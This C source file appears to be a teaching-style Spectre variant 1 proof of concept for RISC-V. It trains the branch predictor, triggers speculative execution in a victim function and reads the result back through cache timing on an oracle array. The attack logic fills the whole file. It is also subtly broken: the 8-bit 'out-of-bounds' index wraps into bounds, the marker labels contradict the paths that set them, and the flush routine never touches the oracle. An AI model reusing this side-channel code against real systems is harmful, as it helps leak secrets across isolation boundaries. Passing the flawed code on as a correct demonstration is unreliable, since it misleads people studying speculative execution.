#include <stdio.h>
#include <stdint.h>
#include "encoding.h"

#define SECRET_VAL 42    // A known value used in victim_memory for this example
#define ARRAY_SIZE 256   // Size of arrays

// Oracle array used for the side channel.
// Each entry is separated by 4096 bytes (likely page size) to minimize cache set collisions.
volatile uint8_t oracle[ARRAY_SIZE * 4096];

// "Victim" memory from which a value might be read speculatively.
volatile uint8_t victim_memory[ARRAY_SIZE];

// "Marker" characters used to signal which speculative path was taken via the oracle array.
#define MARKER_ZERO    'a' // Corresponds to oracle index (ARRAY_SIZE - 1)
#define MARKER_NONZERO 'z' // Corresponds to oracle index 0

/**
 * @brief Attempts to flush the oracle array from the cache.
 * This increases the contrast for detecting cache hits later.
 * Uses a dummy array access pattern as a simple eviction strategy.
 */
void flushOracle() {
    // Access a large dummy array to try to evict the oracle lines from the cache.
    volatile uint8_t dummy[ARRAY_SIZE * 4096];
    for (int i = 0; i < ARRAY_SIZE; i++) {
        dummy[i * 4096] = 1; // Access spaced-out elements
    }
}

/**
 * @brief Measures the access time to a given memory address using the RISC-V cycle counter.
 * @param addr The address to measure access time for.
 * @return The number of cycles taken for the access.
 */
uint64_t measureAccessTime(volatile uint8_t *addr) {
    uint64_t time1, time2;
    time1 = rdcycle();          // Read cycle counter before access
    volatile uint8_t value = *addr; // Perform the memory access
    time2 = rdcycle() - time1;  // Read cycle counter after access and calculate difference
    (void)value; // Prevent unused variable warning
    return time2;
}

/**
 * @brief Checks if accessing the oracle entry corresponding to a marker character is fast (cached).
 * @param c The marker character ('a' or 'z').
 * @return 1 if access time suggests a cache hit, 0 otherwise.
 */
uint8_t isCachedChar(char c) {
    int index;
    if (c == MARKER_NONZERO) { // 'z'
        index = 0; // Oracle position for MARKER_NONZERO ('z')
    } else { // MARKER_ZERO ('a')
        index = ARRAY_SIZE - 1; // Oracle position for MARKER_ZERO ('a')
    }
    // Measure access time to the specific oracle entry
    uint64_t time = measureAccessTime(&oracle[index * 4096]);
    // Assume cached if access time is below a threshold (e.g., 50 cycles)
    return (time < 50);
}

/**
 * @brief Simulates a victim function subject to speculative execution.
 * Demonstrates how a mispredicted bounds check might lead to speculative execution
 * that depends on a value potentially influenced by the attacker or prior state.
 * The speculative path taken leaks information via the oracle array cache state.
 * @param attacker_input An index provided by the attacker. Used for the bounds check.
 */
void victimFunctionSpeculativeInjection(uint8_t attacker_input) {
    // Bounds check branch: Normally true if attacker_input < ARRAY_SIZE.
    // If attacker provides an out-of-bounds index, the branch predictor might still
    // predict 'taken' based on training.
    if (attacker_input < ARRAY_SIZE) {

        // --- Potentially executed speculatively if branch above is mispredicted ---

        // Load from victim memory using the attacker-controlled (or derived) index.
        // If attacker_input was out-of-bounds, this accesses unintended memory speculatively.
        uint8_t spec_val = victim_memory[attacker_input];

        // Speculative data-dependent branch: The path taken depends on 'spec_val'.
        // If 'spec_val' is influenced by the speculative load above, this branch leaks information.
        // Example: If the predictor assumes spec_val is 0 (based on training/bias),
        // but the actual (or speculatively loaded) value is non-zero, it might speculatively
        // execute the 'else' path.
        if (spec_val == 0) {
             // Path taken if spec_val is (or is speculated to be) 0.
             // Access oracle entry corresponding to MARKER_NONZERO ('z')
             printf("Do Not Print"); // Avoid compiler optimization, should not appear
             oracle[0 * 4096] = MARKER_NONZERO; // Loads 'z' cache line
        } else {
             // Path taken if spec_val is (or is speculated to be) non-zero.
             // Access oracle entry corresponding to MARKER_ZERO ('a')
             oracle[(ARRAY_SIZE - 1)*4096] = MARKER_ZERO; // Loads 'a' cache line
        }
        // --- End of speculative execution window ---
    }
}

int main(void) {
    // Initialize victim memory with a known non-zero value.
    for (int i = 0; i < ARRAY_SIZE; i++) {
        victim_memory[i] = SECRET_VAL; // SECRET_VAL is 42 (non-zero)
    }

    // Flush the oracle array to ensure a clean state for detection.
    flushOracle();

    // Attacker provides an out-of-bounds index to trigger misprediction.
    uint8_t attacker_input = ARRAY_SIZE + 10;

    // Train the branch predictor:
    // Repeatedly call the function with in-bounds indices to make the predictor
    // learn that the 'if (attacker_input < ARRAY_SIZE)' branch is usually taken.
    printf("Training branch predictor...\n");
    for (int i = 0; i < 100; i++) {
        victimFunctionSpeculativeInjection(i % ARRAY_SIZE); // Use in-bounds index
    }
    printf("Training complete.\n");


    // Trigger the attack: Call with the out-of-bounds index.
    // The outer 'if' should evaluate to false, but due to training, the processor
    // might speculatively execute the 'if' block anyway.
    printf("Triggering potentially mispredicted execution with out-of-bounds input...\n");
    victimFunctionSpeculativeInjection(attacker_input);

    // Check the cache state: After speculation (if any) completes,
    // measure which oracle entry (marker) is now cached.
    printf("\n== Post-Speculation Results ==\n");

    // Check if the 'z' marker's oracle line is cached (implies spec_val == 0 path taken)
    if (isCachedChar(MARKER_NONZERO)) { // Check for 'z'
        printf("Speculation result: MARKER_NONZERO ('z') found in cache.\n");
        printf("  -> Suggests the 'spec_val == 0' branch path was speculatively executed.\n");
    // Check if the 'a' marker's oracle line is cached (implies spec_val != 0 path taken)
    } else if (isCachedChar(MARKER_ZERO)) { // Check for 'a'
        printf("Speculation result: MARKER_ZERO ('a') found in cache.\n");
        printf("  -> Suggests the 'spec_val != 0' branch path was speculatively executed.\n");
    } else {
        printf("Speculation result: Neither marker found reliably in cache.\n");
    }

     // Since victim_memory contains 42 (non-zero), we expect the spec_val != 0 path ('a') to be cached
     // if the outer branch mispredicts and the inner branch prediction is correct or bypassed.
     // Finding 'z' would imply a more complex interaction or value injection scenario.

    return 0;
}